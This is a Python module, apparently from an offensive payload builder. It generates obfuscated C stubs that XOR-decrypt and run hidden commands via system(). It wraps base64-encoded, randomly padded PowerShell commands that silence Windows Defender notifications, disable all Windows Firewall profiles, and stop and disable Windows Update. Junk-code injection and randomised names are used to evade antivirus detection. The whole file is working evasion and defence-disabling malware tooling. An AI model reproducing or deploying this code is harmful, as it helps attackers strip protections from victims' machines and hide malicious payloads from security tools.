from lib import core, junk
from random import randrange, choice, randint, SystemRandom
from string import digits, ascii_letters
from base64 import b64encode


def hidden_forever(winfwl, winupdt, junkcode, intensity):
    commands = []
    funcstub, code = "", ""

    if winfwl != "no":
        if commands != "":
            commands = []
        commands.append(powershell_encoder('Set-ItemProperty -Path "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\Notifications" -Name "DisableNotifications" -Type DWord -Value 1;Set-NetFirewallProfile -Profile Domain,'
                                           'Public, Private -Enabled False;'))
        xor_func, exec_stub = encrypt_exec(commands, junkcode, intensity)
        funcstub += xor_func
        code += exec_stub
        core.wl_added()

    if winupdt != "no":
        if commands != "":
            commands = []
        commands.append(powershell_encoder('sc.exe config wuauserv start=disabled;sc.exe stop wuauserv;'))
        xor_func, exec_stub = encrypt_exec(commands, junkcode, intensity)
        funcstub += xor_func
        code += exec_stub
        core.wu_added()

    return funcstub, code


def encrypt_exec(commands, junkcode, intensity):
    # Decryptor
    func_name = core.varname_creator()
    arg_command = core.varname_creator()
    arg_key = core.varname_creator()
    arg_command_lenght = core.varname_creator()
    arg_key_lenght = core.varname_creator()
    arg_exec = core.varname_creator()
    i = core.varname_creator()
    func_stub = "void " + func_name + "(int " + arg_command + "[], int " + arg_key + "[], int " + arg_command_lenght + ", int " + arg_key_lenght + ", char " + arg_exec + "[])\n"
    func_stub += "{\n"
    func_stub += junk.junk_inject(junkcode, "code", intensity)
    func_stub += "for(int " + i + " = 0; " + i + "< " + arg_command_lenght + "; " + i + "++)"
    func_stub += "{\n"
    func_stub += junk.junk_inject(junkcode, "code", intensity)
    func_stub += arg_exec + "[" + i + "] = " + arg_command + "[" + i + "] ^ " + arg_key + "[" + i + " % " + arg_key_lenght + "];\n"
    func_stub += junk.junk_inject(junkcode, "code", intensity)
    func_stub += "}\n"
    func_stub += junk.junk_inject(junkcode, "code", intensity)
    func_stub += arg_exec + "[" + arg_command_lenght + "] = 0;\n"
    func_stub += junk.junk_inject(junkcode, "code", intensity)
    func_stub += "}\n"

    keylen = randrange(1024, 4096)
    key = ''.join(choice(digits) for i in range(keylen))
    cmd = list()
    for command in commands:
        cmd.append(xor_encrypt(command, key))

    vKeylen = core.varname_creator()
    vKey = core.varname_creator()
    vNumcommands = core.varname_creator()
    vSizeofcommands = core.varname_creator()
    vMaxcommandsize = core.varname_creator()
    vCommands = core.varname_creator()
    vExeccommands = core.varname_creator()
    i = core.varname_creator()
    code = "int " + vKeylen + f" = {len(key)};\n"
    code += junk.junk_inject(junkcode, "code", intensity)
    code += "int " + vKey + f"[] = {{{str([ord(k) for k in key])[1:-1]}}};\n"
    code += junk.junk_inject(junkcode, "code", intensity)
    code += "int " + vNumcommands + f" = {len(commands)};\n"
    code += junk.junk_inject(junkcode, "code", intensity)
    code += "int " + vSizeofcommands + f"[] = {{{', '.join([str(len(data)) for data in cmd])}}};\n"
    code += junk.junk_inject(junkcode, "code", intensity)
    max_length = max([len(data) for data in cmd])
    code += "int " + vMaxcommandsize + f" = {max_length};\n"
    code += junk.junk_inject(junkcode, "code", intensity)
    code += "int " + vCommands + f"[][{max_length}] = {{{', '.join(['{' + str(cmds)[1:-1] + '}' for cmds in cmd])}}};\n"
    code += junk.junk_inject(junkcode, "code", intensity)
    code += "char " + vExeccommands + "[" + vNumcommands + "][" + vMaxcommandsize + " + 1];\n"
    code += junk.junk_inject(junkcode, "code", intensity)
    code += "for(int " + i + " = 0; " + i + " < " + vNumcommands + "; " + i + "++)\n"
    code += "{\n"
    code += junk.junk_inject(junkcode, "code", intensity)
    code += func_name + "(" + vCommands + "[" + i + "], " + vKey + ", " + vSizeofcommands + "[" + i + "], " + vKeylen + ", " + vExeccommands + "[" + i + "]);\n"
    code += junk.junk_inject(junkcode, "code", intensity)
    code += "system(" + vExeccommands + "[" + i + "]);"
    code += junk.junk_inject(junkcode, "code", intensity)
    code += "}\n"
    return func_stub, code


def xor_encrypt(data, key):
    key = [ord(k) for k in key]
    return [ord(data[i]) ^ key[(i % len(key))] for i in range(len(data))]


def powershell_encoder(commands):
    encoded_command = ''.join(SystemRandom().choice(ascii_letters) for _ in range(randint(64, 256)))
    math1 = ''.join(SystemRandom().choice(ascii_letters) for _ in range(randint(64, 256)))
    math2 = ''.join(SystemRandom().choice(ascii_letters) for _ in range(randint(64, 256)))
    math3 = ''.join(SystemRandom().choice(ascii_letters) for _ in range(randint(64, 256)))
    math4 = ''.join(SystemRandom().choice(ascii_letters) for _ in range(randint(64, 256)))
    math5 = ''.join(SystemRandom().choice(ascii_letters) for _ in range(randint(64, 256)))
    math6 = ''.join(SystemRandom().choice(ascii_letters) for _ in range(randint(64, 256)))
    pad = "$" + math1 + "=" + str(randint(999, 99999999)) + "*" + str(randint(999, 99999999)) + ";"
    pad += "$" + math2 + "=" + "$" + math1 + "*" + str(randint(999, 99999999)) + ";"
    pad += "$" + math3 + "=" + "$" + math2 + "*" + str(randint(999, 99999999)) + ";"
    pad += str(commands)
    pad += "$" + math4 + "=" + str(randint(999, 99999999)) + "*" + str(randint(999, 99999999)) + ";"
    pad += "$" + math5 + "=" + "$" + math4 + "*" + str(randint(999, 99999999)) + ";"
    pad += "$" + math6 + "=" + "$" + math5 + "*" + str(randint(999, 99999999))
    pad = b64encode(pad.encode("ascii"))
    command = 'powershell.exe -command "$' + encoded_command + "=[Text.Encoding]::Utf8.GetString([Convert]::FromBase64String('" + str(pad) + "));" + "powershell.exe -command $" + encoded_command + '"'
    command = command.replace("b'", "")
    return command
